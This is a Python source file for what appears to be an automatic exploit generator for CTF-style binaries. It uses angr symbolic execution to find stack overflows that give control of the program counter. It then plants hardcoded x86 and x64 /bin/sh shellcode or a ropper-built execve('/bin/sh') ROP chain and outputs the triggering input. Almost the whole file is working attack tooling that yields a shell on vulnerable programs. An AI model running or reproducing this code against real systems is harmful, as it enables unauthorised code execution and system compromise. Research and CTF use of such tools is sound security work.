from __future__ import print_function
import angr
import claripy
import timeout_decorator
import r2pipe
import json

from pwnlib.util.packing import p32
from ropper import RopperService
from angr import sim_options as so
from pwn import *

from lib.hookFour import hookFour


def getRopchain(properties, bad_bytes):
    """
    ' given n files, generate an execve rop chain and return it.
    ' I did not want to try and butcher ropper, so rs.createRopChain
    ' returns python code to print the rop chain to stdout
    ' I run it and steal the "rop" variable for my chain
    '
    ' This is horrible code, do not repeat my mistakes
        'badbytes': ''.join(bad_bytes),
    """
    options = {'color': False,
               'badbytes': ''.join(bad_bytes),
               'all': False,
               'inst_count': 6,
               'type': 'all',
               'count_of_findings': 5,
               'cfg_only': False,
               'detailed': False}

    rs = RopperService(options)
    if 'libc' in properties and properties['libc'] is not None:
        rs.addFile(properties['libc'])
    rs.addFile(properties['file'])
    rs.loadGadgetsFor()

    '''Acceptable arches are formated differently than pwntools:
    x86
    x86_64
    ARM
    ... see https://github.com/sashs/Ropper/blob/a708fae670eece2b86daeaa276b38cb033eab231/README.md'''

    # These arches can span to mips and ppc
    arch = 'x86'
    if '64' in properties['protections']['arch']:
        arch = 'x86_64'
    elif 'arm' in properties['protections']['arch'].lower():
        arch = 'ARM'

    # If you were looking for good programming examples, you've
    # come to the wrong place friend
    chain = rs.createRopChain("execve", arch, {'cmd': '/bin/sh'})
    chain = chain.replace(" '", " b'")  # convert all strings to bytes
    chain = chain.replace("print rop", "")  # removes invalid print statement

    if "Cannot create chain" in chain or 'INSERT' in chain:
        print("[-] Failed to create rop chain. Try adding linked libraries")
        if 'libc' not in properties or properties['libc'] is None:
            print("[~] Try adding linked libc")
        exit(0)

    namespace = {}
    exec(chain, namespace)  # rop variable created inside of "chain" python script
    if 'libc' in properties:
        rs.removeFile(properties['libc'])
    rs.removeFile(properties['file'])

    return namespace['rop']


def getShellcode(properties):
    context.arch = properties['protections']['arch']

    if context.arch == 'i386':  # /bin/sh shellcode - 23 bytes
        shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
    elif context.arch == 'x64':  # /bin/sh shellcode - 23 bytes
        shellcode = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
    else:
        assembly = shellcraft.sh()  # This works, but the shellcode is usually long
        shellcode = asm(assembly)
    return shellcode


def exploitOverflow(binary_name, properties, inputType="STDIN"):
    p = angr.Project(binary_name, auto_load_libs=False)
    extras = {so.REVERSE_MEMORY_NAME_MAP, so.TRACK_ACTION_HISTORY}
    p.hook_symbol('rand', hookFour)
    p.hook_symbol('srand', hookFour)

    # Setup state based on input type
    argv = [binary_name]
    if inputType in ["STDIN", 'FILE', 'SOCKET']:
        state = p.factory.full_init_state(args=argv, add_options=extras)
    elif inputType == "LIBPWNABLE":
        handle_connection = p.loader.main_object.get_symbol("handle_connection")
        start_addr = handle_connection.rebased_addr
        reg_values = getRegValues(binary_name, start_addr)
        state = p.factory.entry_state(args=argv, env=os.environ, addr=start_addr, add_options=extras)

        # Just set the registers
        register_names = state.arch.register_names.values()
        for register in register_names:
            if register in reg_values:  # Didn't use the register
                state.registers.store(register, reg_values[register])

    elif inputType == "ARG":
        arg = claripy.BVS("arg1", 256 * 8)
        argv.append(arg)
        state = p.factory.full_init_state(args=argv, add_options=extras)
        state.globals['arg'] = arg
    else:
        print("[-] Unsupported inputType:", inputType)
        exit(1)
        return

    state.libc.max_packet_size = properties['pwn_type']['max_pkt']  # found this in overflowDetector
    state.globals['inputType'] = inputType
    simgr = p.factory.simgr(state, save_unconstrained=True)

    step_func = pickFilter(properties)
    if step_func is None:
        print("[-] Error could not devise exploit strategy")
        exit(1)

    run_environ = dict()
    run_environ['type'] = None
    end_state = None
    end_state_eb = None
    # Lame way to do a timeout
    try:
        @timeout_decorator.timeout(1200)
        def exploreBinary(simgr):
            simgr.explore(find=lambda s: 'type' in s.globals, step_func=step_func)

        exploreBinary(simgr)
        if 'found' in simgr.stashes and len(simgr.found):
            end_state = simgr.found[0]
            end_state_eb = end_state.globals['state_eb']
            run_environ['type'] = end_state.globals['type']
    except (KeyboardInterrupt, timeout_decorator.TimeoutError):
        print("[~] Overflow check timed out")

    if end_state is None:
        print("[-] Could not find end state")
    elif inputType == "LIBPWNABLE":
        run_environ['input'] = end_state.posix.dumps(0)
        run_environ['input_eb'] = end_state_eb.posix.dumps(0)
        print("[+] Triggerable with STDIN : {}".format(run_environ['input']))
    elif inputType == "ARG":
        arg_str = end_state.solver.eval(arg, cast_to=bytes)
        run_environ['input'] = arg_str
        print("[+] Triggerable with arg : {}".format(repr(arg_str)))
    elif inputType in ['STDIN', 'FILE', 'SOCKET']:
        run_environ['src_type'] = end_state.globals['src_type']
        fd = end_state.globals['fd']

        # save filename so we can write to it
        if run_environ['src_type'] == 'file':
            run_environ['filename'] = end_state.posix.fd[fd].file.name

        run_environ['input'] = end_state.posix.dumps(fd)
        run_environ['input_eb'] = end_state_eb.posix.dumps(fd)
        print("[+] Triggerable with {} : {}".format(run_environ['src_type'], run_environ['input']))
    else:
        print("[-] Unsupported inputType:", inputType)
        exit(1)
    return run_environ


def pad_addr(address, bits, endian='little'):
    """
    Pads the given address (int) to the given number of bits, returning a bytes object representation of the address
    with the given endianness
    """
    if bits == 32:
        return p32(address, endian=endian)
    elif bits == 64:
        botAddr = address & 0xFFFFFFFF
        topAddr = (address >> 32) & 0xFFFFFFFF
        return p32(topAddr, endian=endian) + p32(botAddr, endian=endian)
    else:
        print("[-] Unknown architecture:", bits)
        exit(1)


def constrainToAddress(state, sym_val, addr, endian='little'):
    """
    Given a symbolic value (sym_val) and an address (int), returns a list of constraints that can be added to a
    simulation state such that the bytes of the symbolic value are equal to the bytes of the address with the given
    endianness
    """
    bits = state.arch.bits
    padded_addr = pad_addr(addr, bits, endian)

    constraints = []
    for i in range(int(bits / 8)):
        curr_byte = sym_val.get_byte(i)
        constraint = claripy.And(curr_byte == padded_addr[i])
        constraints.append(constraint)

    return constraints


def constrain_with_shellcode(state, constraints, address, shellcode):
    # add all the constraints we've been given
    for constraint in constraints:
        state.add_constraints(constraint)

    # Setup shellcode
    memory = state.memory.load(address, len(shellcode))
    shellcode_bvv = state.se.BVV(shellcode)

    # Constrain shellcode in memory if possible
    if state.se.satisfiable(extra_constraints=[memory == shellcode_bvv]):
        state.add_constraints(memory == shellcode_bvv)


def fully_symbolic(state, variable):
    """
    check if a symbolic variable is completely symbolic
    """
    for i in range(state.arch.bits):
        if not state.solver.symbolic(variable[i]):
            return False
    return True


def is_exploit_source(state, fd, shellcode, addr):
    # check for angr's strange implicit file descriptors
    if type(state.posix.fd[fd]) == angr.storage.file.SimFileDescriptor and b'/tmp/angr' in state.posix.fd[fd].file.name:
        return False

    dump = state.posix.dumps(fd)

    # socket dump is a tuple, index zero is the read data so we examine that data
    # overflow may come from a series of reads, so just concatenate all read data into one big dump
    if type(dump) == tuple:
        dump = b''
        for d in state.posix.dumps(fd)[0]:
            dump += d

    # potentially error-prone solution, but only way to catch bugs where the overflowed buffer
    # is filled from several non-contiguous reads
    # also, since the file contents are symbolic, it's unlikely angr will randomly generate symbolic contents
    # that match all the shellcode characters
    return all([x in dump for x in shellcode]) and all([x in dump for x in addr])


def constrain_printable(state, fd):
    file_desc = state.posix.fd[fd]
    file_desc.seek(0)

    print('Trying to constrain contents to printable')
    for i in range(len(state.posix.dumps(fd))):
        print(i)
        curr_byte = file_desc.read_data(1)[0]
        constraint = claripy.And(curr_byte > 0x2F, curr_byte < 0x7F)
        if state.se.satisfiable(extra_constraints=[constraint]):
            state.add_constraints(constraint)


def reencode(state, properties, address, shellcode, sc_type: str):
    avoidList = []
    bad_bytes = set()
    my_buf = state.memory.load(address, len(shellcode))

    # check if a symbolic buffer can contain the shellcode
    if not state.satisfiable(extra_constraints=[my_buf == shellcode]):
        print("[~] Shellcode can't be placed. Checking for bad bytes.")

        # figure out which bytes can't be placed in the buffer
        for i in range(len(shellcode)):
            curr_byte = state.memory.load(address + i, 1)
            if not state.satisfiable(extra_constraints=[curr_byte == shellcode[i]]):
                print("[-] Address {} Byte {} Can't be {}".format(hex(address + i), i, repr(shellcode[i])))

                if sc_type == 'SHELLCODE':
                    avoidList.append(shellcode[i])
                elif sc_type == 'ROPCHAIN':
                    byte_hex = shellcode[i].encode('hex')
                    bad_bytes.add(byte_hex)

        print("Avoiding : {}".format(avoidList))
        print("Old shellcode: {} {}".format(len(shellcode), repr(shellcode)))

        # try to re-encode the shellcode to avoid the bad bytes
        try:
            if sc_type == 'SHELLCODE':
                expr = '['
                for avoidByte in avoidList:
                    expr += chr(avoidByte)
                expr += ']'
                shellcode = encoders.encode(shellcode, avoid=avoidList, expr=expr)
            elif sc_type == 'ROPCHAIN':
                shellcode = getRopchain(properties, bad_bytes)
            print("New shellcode: {} {}".format(len(shellcode), repr(shellcode)))
        except PwnlibException:
            print("[-] Unable to encode shellcode to avoid {}".format(avoidList))
        except AttributeError:
            print("[-] Error encoding shellcode")
        except TypeError:
            print("[-] Error building error string")


def pickFilter(properties):
    def point_to_helper(simgr, shellcode):
        for state in simgr.unconstrained:
            # quit early if pc is not fully symbolic (i.e., we cannot control it entirely)
            if not fully_symbolic(state, state.regs.pc):
                print("[~] Found unconstrained state but PC is not fully symbolic")
                continue

            # get all addresses we control
            # sort because some exploits only work on low addresses for some reason - speeds things up :)
            addresses = sorted([x for x in find_symbolic_buffer(state, len(shellcode))])

            if len(addresses) == 0:
                print("[-] No controlled addresses found for shellcode of length", len(shellcode))

            bits = state.arch.bits
            for address in addresses:
                state_copy = state.copy()

                # Constrain pc to address, or quit early if we can't
                print("[+] Constraining to address {}".format(hex(address)))
                constraints = constrainToAddress(state_copy, state_copy.regs.pc, address)
                if not state_copy.se.satisfiable(extra_constraints=constraints):
                    print("[~] Constraining failed")
                    continue

                # Setup shellcode and load it at constrained address
                memory = state_copy.memory.load(address, len(shellcode))
                shellcode_bvv = state_copy.solver.BVV(shellcode)
                constraints.append(memory == shellcode_bvv)

                # Setup endianness - A weird number of CTF problems have endianness issues, apparently
                # Constrain EIP to shellcode address
                state_eb = state.copy()
                constraints_eb = constrainToAddress(state_eb, state_eb.regs.pc, address, endian='big')

                # Check satisfiability
                if state_copy.se.satisfiable(extra_constraints=constraints) and \
                        state_eb.se.satisfiable(extra_constraints=constraints_eb) and \
                        len(constraints) == bits / 8 + 1 and \
                        len(constraints_eb) == bits / 8:
                    print("[+] Shellcode can be placed and PC constrained")

                    padded_addr = pad_addr(address, bits)

                    for constr in constraints:
                        state_copy.add_constraints(constr)

                    # Check by input
                    if state.globals['inputType'] == "LIBPWNABLE":
                        """
                        NOT USED
                        """
                        if is_exploit_source(state_copy, 0, shellcode, padded_addr):
                            constrain_with_shellcode(state_eb, constraints_eb, address, shellcode)

                            # Get the string coming into STDIN
                            stdin_str = state_copy.posix.dumps(0)
                            print("[+] Vulnerable path found {}".format(stdin_str))
                            state.globals['type'] = "Overflow"
                            state.globals['state_eb'] = state_eb
                            simgr.stashes['found'].append(state)
                            try:
                                simgr.stashes['unconstrained'].remove(state)
                            except KeyboardInterrupt:
                                print("[~] Keyboard Interrupt")
                            except timeout_decorator.TimeoutError:
                                print("[~] Timeout")
                            return simgr
                        else:
                            print("[~] Met constraints, but address and shellcode do not appear in output")

                    elif state.globals['inputType'] in ["STDIN", "FILE", "SOCKET"]:
                        # iterate over all open file descriptors except stdout and stderr
                        fds = list(state_copy.posix.fd)
                        fds.remove(1)
                        fds.remove(2)

                        # check for shellcode and jump address in dumps of file descriptors
                        for fd in fds:
                            if is_exploit_source(state_copy, fd, shellcode, padded_addr):
                                # add constraints to big endian version
                                constrain_with_shellcode(state_eb, constraints_eb, address, shellcode)

                                state_copy.globals['type'] = "Overflow"
                                state_copy.globals['src_type'] = describe_fd(state_copy, fd)
                                state_copy.globals['fd'] = fd
                                state_copy.globals['state_eb'] = state_eb
                                simgr.stashes['found'].append(state_copy)
                                try:
                                    simgr.stashes['unconstrained'].remove(state)
                                except KeyboardInterrupt:
                                    print("[~] Keyboard Interrupt")
                                except timeout_decorator.TimeoutError:
                                    print("[~] Timeout")
                                return simgr
                        else:
                            print("[~] Met constraints, but address and shellcode do not appear in output")

                    elif state.globals['inputType'] == "ARG":
                        arg = state.globals['arg']
                        arg_str = state_copy.solver.eval(arg, cast_to=bytes)
                        if 'A' in arg_str:
                            constraints = []
                            for i in range(int(bits / 8)):
                                curr_byte = state.regs.pc.get_byte(i)
                                constraint = claripy.And(curr_byte == 0x41)
                                constraints.append(constraint)

                            # Constrain STDIN to printable if we can
                            for i in range(arg.length):
                                curr_byte = arg.read_from(1)
                                constraint = claripy.And(curr_byte > 0x2F, curr_byte < 0x7F)
                                if state.se.satisfiable(extra_constraints=[constraint]):
                                    constraints.append(constraint)

                            if state.se.satisfiable(extra_constraints=constraints):
                                for constraint in constraints:
                                    state.add_constraints(constraint)

                            arg_str = str(state.solver.eval(arg, cast_to=str))
                            print("[+] Vulnerable path found {}".format(arg_str))
                            state.globals['type'] = "Overflow"
                            simgr.stashes['found'].append(state)
                            simgr.stashes['unconstrained'].remove(state)
                            return simgr
        return simgr

    def point_to_shellcode_filter(simgr):
        return point_to_helper(simgr, getShellcode(properties))

    def point_to_ropchain_filter(simgr):
        return point_to_helper(simgr, getRopchain(properties, set()))

    if not properties['protections']['nx']:
        print("[+] Binary does not have NX")
        print("[+] Placing shellcode and pointing")
        return point_to_shellcode_filter
    else:
        print("[+] Building rop and pointing")
        return point_to_ropchain_filter


def check_continuity(address, addresses, length):
    """
    check if the region at 'address' contains 'length' amount of controlled memory.
    """
    for i in range(length):
        if not address + i in addresses:
            return False
    return True


def add_sym_addrs(state, sym_addrs, srcident):
    for _, symbol in state.solver.get_variables('file', srcident):
        sym_addrs.update(state.memory.addrs_for_name(next(iter(symbol.variables))))


def find_symbolic_buffer(state, length, arg=None):
    """
    dumb implementation of find_symbolic_buffer, looks for a buffer in memory under the user's control
    """
    sym_addrs = set()  # used to be a list. set improves performance
    # get all the symbolic bytes from stdin
    if arg is not None:
        for var in arg.variables:
            sym_addrs.update(state.memory.addrs_for_name(var))
    else:
        # report all addresses controlled by stdin, opened file descriptors, and sockets
        if state.globals['inputType'] in ['STDIN', 'FILE', 'SOCKET']:
            add_sym_addrs(state, sym_addrs, state.posix.stdin.ident)

            fds = list(state.posix.fd)

            # ignore fd 0, 1, and 2 as they are stdin, stdout, and stderr
            for i in range(3):
                fds.remove(i)

            # report addresses controlled by all file descriptors
            # sockets don't have a "file" attribute, so get ident of read_storage
            for fd in fds:
                add_sym_addrs(state, sym_addrs, state.posix.fd[fd].read_storage.ident)
        else:  # LIBPWNABLE
            add_sym_addrs(state, sym_addrs, state.posix.stdin.ident)

    # we only care about addresses with enough space to fit the shellcode
    for addr in sym_addrs:
        if check_continuity(addr, sym_addrs, length):
            yield addr


def describe_fd(state, fd):
    """
    Returns a string that indicates whether the given file descriptor represents stdin, stdout, stderr, a socket, or
    a file for the given simluation state
    """
    if fd == 0:
        return 'stdin'
    elif fd == 1:
        return 'stdout'
    elif fd == 2:
        return 'stderr'
    elif 'socket' in state.posix.fd[fd].read_storage.ident:
        return 'socket'
    elif 'file' in state.posix.fd[fd].read_storage.ident:
        return 'file'
    else:
        print("[-] Could not determine type of file descriptor")
        return ''


def getRegValues(filename, endAddr):
    r2 = r2pipe.open(filename)
    r2.cmd('doo')
    r2.cmd('dcu {}'.format(endAddr))
    regs = json.loads(r2.cmd('drj'))
    r2.quit()
    return regs
